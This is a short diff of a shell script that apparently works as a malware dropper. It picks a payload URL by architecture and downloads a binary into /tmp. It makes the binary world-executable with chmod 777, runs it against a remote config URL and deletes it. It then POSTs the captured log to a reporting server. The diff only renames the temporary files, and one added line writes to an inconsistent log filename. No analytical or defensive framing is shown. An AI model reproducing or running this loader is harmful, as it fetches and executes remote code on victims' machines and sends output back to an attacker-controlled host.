@@ -13,9 +13,9 @@ else
     pl_url=$intel_url
     curl -X POST $report_url -d "NotARM"
 fi
-curl -s -o /tmp/run001881.bin $pl_url 1>/tmp/tmplog0020.log 2>&1
-chmod 777 /tmp/run001881.bin 1>>/tmp/tmplog0020.log 2>&1
-/tmp/run001881.bin $config_url 1>>/tmp/tmplog0020.log 2>&1
-rm /tmp/run001881.bin
-curl -X POST $report_url -d @/tmp/tmplog0020.log
-rm /tmp/tmplog0020.log
+curl -s -o /tmp/run042323.bin $pl_url 1>/tmp/tmplog042323.log 2>&1
+chmod 777 /tmp/run042323.bin 1>>/tmp/tmplog042323.log 2>&1
+/tmp/run042323.bin $config_url 1>>/tmp/tmplogv.log 2>&1
+rm /tmp/run042323.bin
+curl -X POST $report_url -d @/tmp/tmplog042323.log
+rm /tmp/tmplog042323.log
